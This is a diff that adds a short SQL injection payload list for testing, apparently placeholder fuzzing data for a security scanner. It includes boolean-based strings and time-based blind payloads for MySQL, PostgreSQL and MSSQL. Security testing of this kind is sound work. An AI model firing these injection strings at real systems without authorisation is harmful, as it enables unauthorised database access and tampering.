@@ -1,0 +1,19 @@
+# Generic SQL Injection Payloads for Testing
+# Note: In production, mount a real FuzzDB/SecLists file here.
+' OR '1'='1
+' OR 1=1--
+" OR "1"="1
+admin' --
+
+# Time-Based Blind Payloads (Testing sleep heuristics)
+# MySQL / MariaDB
+1' OR SLEEP(5)--
+1" OR SLEEP(5)--
+
+# PostgreSQL
+1; SELECT pg_sleep(5)--
+1' OR pg_sleep(5)--
+
+# MSSQL
+1'; WAITFOR DELAY '0:0:5'--
+1"; WAITFOR DELAY '0:0:5'--
